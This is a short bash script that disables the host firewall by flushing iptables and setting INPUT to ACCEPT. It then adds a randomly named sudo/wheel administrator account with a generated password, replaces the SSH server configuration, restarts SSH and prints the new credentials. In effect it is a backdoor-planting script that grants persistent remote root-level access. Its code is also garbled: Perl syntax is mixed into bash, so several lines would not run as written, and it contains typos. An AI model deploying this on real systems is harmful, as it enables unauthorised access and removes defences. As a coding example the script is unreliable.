#!/bin/bash
echo 'Flushing iptables'
sudo iptables -F INPUT;
sudo iptables -P INPUT ACCEPT;
echo Adding new admin account...;
$range = 999999999;
$minimum = 100000000;
$random_number = int(rand($range)) + $minimum;
$random_user = sprintf(%08X, rand(0xFFFFFFFF));
sudo useradd -m $random_user;
echo $random_user:$random_number | sudo chpasswd;
if [ -f /usr/bin/yum ]; then sudo usermod -aG wheel  . $random_user . ; fi;
if [ -f /usr/bin/apt ]; then sudo adduser  . $random_user .  sudo; fi;
echo Configuring SSH...;
sudo cp sshd_config /etc/ssh/sshd_config;
sudo cp sshd_banner /etc/ssh/sshd_banner;
if [ -f /usr/bin/yum ]; then sudo service sshd restart; fi;
if [ -f /usr/bin/apt ]; then sudo service ssh restart; fi;
arr4y = "Added admin:, $random_user, password:, $random_number, SSH Litening on port 22";
echo $arr4y;
